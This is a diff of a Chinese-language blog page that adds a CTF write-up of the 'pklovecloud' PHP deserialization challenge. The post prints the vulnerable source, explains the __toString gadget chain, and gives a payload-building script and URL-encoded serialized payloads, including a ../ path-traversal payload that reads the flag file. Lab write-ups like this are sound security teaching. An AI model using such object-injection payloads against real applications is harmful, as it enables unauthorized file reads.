@@ -69,6 +69,69 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-第四周1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A81/" class="article-date">
+  <time class="dt-published" datetime="2025-02-03T11:14:56.000Z" itemprop="datePublished">2025-02-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A81/">第四周1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题解：  [第五空间 2021]pklovecloud </p>
+<ol>
+<li><p>打开环境发现了php代码：</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">class pkshow </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">echo_name</span></span>()     </span><br><span class="line">    &#123;          </span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected <span class="variable">$cinder</span>;  </span><br><span class="line">    public <span class="variable">$neutron</span>;</span><br><span class="line">    public <span class="variable">$nova</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>() </span><br><span class="line">    &#123;      </span><br><span class="line">        <span class="variable">$this</span>-&gt;cinder = new pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()      </span><br><span class="line">    &#123;          </span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="variable">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$this</span>-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class ace</span><br><span class="line">&#123;    </span><br><span class="line">    public <span class="variable">$filename</span>;     </span><br><span class="line">    public <span class="variable">$openstack</span>;</span><br><span class="line">    public <span class="variable">$docker</span>; </span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">echo_name</span></span>()      </span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="variable">$this</span>-&gt;openstack = unserialize(<span class="variable">$this</span>-&gt;docker);</span><br><span class="line">        <span class="variable">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;openstack-&gt;neutron === <span class="variable">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;./&#123;<span class="variable">$this</span>-&gt;filename&#125;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="built_in">return</span> file_get_contents(<span class="variable">$file</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="built_in">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$logData</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$logData</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(__file__); </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>我们进行代码审计  对于反序列化题  最重要就是看代码<br>我们先找危险函数或者一些执行代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">这个高亮代码可以</span><br></pre></td></tr></table></figure>
+<p>再看他有几个类  ace acp pkshow这三个类</p>
+</li>
+<li><p>我们再看一下这个魔法函数  对于反序列话  就应该tostring函数可以用<br>在主代码中有个echo函数  可以可以  在反序列化时会自动触发tostring函数</p>
+</li>
+<li><p>简单概括就是  第一个类啥也没用  我们以tostring方法为切入点<br>与ace类连接  对于代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$this</span>-&gt;openstack = unserialize(<span class="variable">$this</span>-&gt;docker);</span><br><span class="line">     <span class="variable">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;openstack-&gt;neutron === <span class="variable">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">     我们可以选择让docker=null   即null=null  可以绕过</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>分析完了之后  我们就开始构造代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected <span class="variable">$cinder</span>;  </span><br><span class="line">    public <span class="variable">$neutron</span>;</span><br><span class="line">    public <span class="variable">$nova</span>;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class ace</span><br><span class="line">&#123;    </span><br><span class="line">    public <span class="variable">$filename</span>;     </span><br><span class="line">    public <span class="variable">$openstack</span>;</span><br><span class="line">    public <span class="variable">$docker</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new acp();</span><br><span class="line"><span class="variable">$b</span> = new ace();</span><br><span class="line"><span class="variable">$a</span>-&gt;cinder = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;docker = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>   得到结果：O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3<br>   BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%<br>   22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3Bs%3A56%3A%22O%3<br>   A8%3A%22stdClass%22%3A2%3A%7Bs%3A7%3A%22neutron%22%3Bs%3A1%3A%22a%22%3Bs%<br>   3A4%3A%22nova%22%3BR%3A2%3B%7D%22%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%<br>   3A%22nova%22%3BN%3B%7D</p>
+</li>
+<li><p>用pks&#x3D; O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3<br>   BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%<br>   22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3Bs%3A56%3A%22O%3<br>   A8%3A%22stdClass%22%3A2%3A%7Bs%3A7%3A%22neutron%22%3Bs%3A1%3A%22a%22%3Bs%<br>   3A4%3A%22nova%22%3BR%3A2%3B%7D%22%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%<br>   3A%22nova%22%3BN%3B%7D试一下<br>   看到源代码 有个flag的位置&#x2F;nssctfasdasdflag</p>
+</li>
+<li><p>我们修改payload：pks&#x3D;O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder<br>%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A34%3A%22..%2F..<br>%2F..%2F..%2F..%2F..%2Fnssctfasdasdflag%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%<br>3A6%3A%22docker%22%3Bs%3A17%3A%22O%3A6%3A%22pkshow%22%3A0%3A%7B%7D%22%3B%7Ds%<br>3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D<br>成功获得flag</p>
+</li>
+<li><p>总结：反序列话 一定要看魔法函数  关于整体的结构<br>关于flag的位置  可能是在根目录</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A81/" data-id="cm6ozb0yg0000dwui7bmxgzlj" data-title="第四周1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-第三周3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/29/%E7%AC%AC%E4%B8%89%E5%91%A83/" class="article-date">
@@ -590,50 +653,11 @@ echo '~'.urlencode(~'0');
 
 
   
-    <article id="post-sx" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/12/sx/" class="article-date">
-  <time class="dt-published" datetime="2025-01-12T11:43:22.000Z" itemprop="datePublished">2025-01-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/12/sx/">sx</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><img src="https://github.com/wbwb-rgb/wbwb-rgb.github.io/blob/main/imgs/text.png"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/12/sx/" data-id="cm5ulxzzn00096gui7a9k2gd5" data-title="sx" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -652,7 +676,7 @@ echo '~'.urlencode(~'0');
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
     </div>
   </div>
 
@@ -663,6 +687,10 @@ echo '~'.urlencode(~'0');
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/02/03/%E7%AC%AC%E5%9B%9B%E5%91%A81/">第四周1</a>
+          </li>
         
           <li>
             <a href="/2025/01/29/%E7%AC%AC%E4%B8%89%E5%91%A83/">第三周3</a>
@@ -678,10 +706,6 @@ echo '~'.urlencode(~'0');
         
           <li>
             <a href="/2025/01/21/%E7%AC%AC%E4%BA%8C%E5%91%A83/">第二周3</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/21/%E7%AC%AC%E4%BA%8C%E5%91%A82/">第二周2</a>
           </li>
         
       </ul>
